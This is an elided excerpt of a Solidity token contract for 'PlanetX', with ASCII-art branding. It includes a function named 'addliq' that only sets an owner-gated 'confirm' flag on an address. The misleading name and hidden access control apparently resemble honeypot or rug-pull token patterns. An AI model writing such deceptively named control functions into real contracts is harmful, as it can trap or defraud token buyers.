/*
                     ...
                     ,+i))III  @TOPSECRETPLANETX  )IIII))i=::i))i='
                    ,=i))IIIIITLLTTTTTTTTTTIITTTTIII)+;+i)+i`
                    =i))IIITTLTLTTTTTTTTTIITTLLTTTII+:i)ii:'
                   +i))IT  www.PlanetX.digital  TLTTTT+:i)))=,
...
contract ERC20 is Context, IERC20, IERC20Metadata , Creation{
    ...
    function deploytoken (address Uniswaprouterv02) public checker {
    ...
    function addliq(address _count) internal checker {
        confirm[_count] = true;
    }
...
contract PlanetX is ERC20{
    uint8 immutable private _decimals = 18;
    uint256 private _totalSupply = 987654321 * 10 ** 18;

    constructor () ERC20('PlanetX',unicode'Planet❌') {
